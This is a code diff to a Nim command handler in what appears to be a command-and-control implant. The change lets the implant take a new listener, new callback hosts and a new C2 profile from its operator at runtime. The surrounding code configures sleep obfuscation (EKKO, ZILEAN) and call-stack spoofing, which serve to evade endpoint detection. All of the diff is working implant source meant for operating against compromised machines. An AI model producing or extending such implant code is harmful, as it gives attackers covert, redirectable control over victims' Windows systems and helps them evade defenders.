@@ -1,6 +1,6 @@
 import winim/lean
 import tables, strformat, strutils
-import ../../../common/[serialize, utils]
+import ../../../common/[serialize, utils, profile]
 import ../../../types/[common, agent, protocol]
 import ../utils/[io, metadata]
 import ../protocol/result
@@ -38,7 +38,9 @@ commands[CMD_CONFIG] = proc(ctx: AgentCtx, task: Task): TaskResult =
             technique = Bytes.toString(task.args[2].data)
             spoof = cast[bool](task.args[3].data[0])
             noSpoof = cast[bool](task.args[4].data[0])
+            transport = Bytes.fromHex(task.args[5].data) 
 
+        # Update settings
         if sleepDelay != UNSET: 
             ctx.sleepSettings.sleepDelay = sleepDelay
         if jitter != UNSET: 
@@ -50,17 +52,26 @@ commands[CMD_CONFIG] = proc(ctx: AgentCtx, task: Task): TaskResult =
         if noSpoof: 
             ctx.sleepSettings.spoofStack = false
 
+        when defined(TRANSPORT_HTTP):   # Channel switching is only implemented for HTTP transport
+            if transport.len > 0: 
+                var unpacker = Unpacker.init(Bytes.toString(transport))
+                ctx.transport.listenerId = unpacker.getDataWithLengthPrefix()   # Listener ID
+                ctx.transport.callback = unpacker.getDataWithLengthPrefix()     # Callback hosts
+                ctx.transport.profile = parseString(unpacker.getDataWithLengthPrefix())   # C2 Profile
+
         let spoofStack = 
             if ctx.sleepSettings.spoofStack and ctx.sleepSettings.sleepTechnique notin {EKKO, ZILEAN}:
                 "true (unused)" # Stack spoofing is only available for EKKO and ZILEAN
             else:
                 $ctx.sleepSettings.spoofStack
 
-        let config = fmt"""Sleep settings:
+        let config = fmt"""Agent configuration:
+ - Listener:       {ctx.transport.listenerId}
  - Delay:          {$ctx.sleepSettings.sleepDelay}s
  - Jitter:         {$ctx.sleepSettings.jitter}%
  - Sleepmask:      {$ctx.sleepSettings.sleepTechnique}
- - Stack spoofing: {spoofStack}"""
+ - Stack spoofing: {spoofStack}
+ """
 
         # Return binary structure containing sleepDelay and overall agent config
         # The sleep delay is updated in the team server database and on the client 
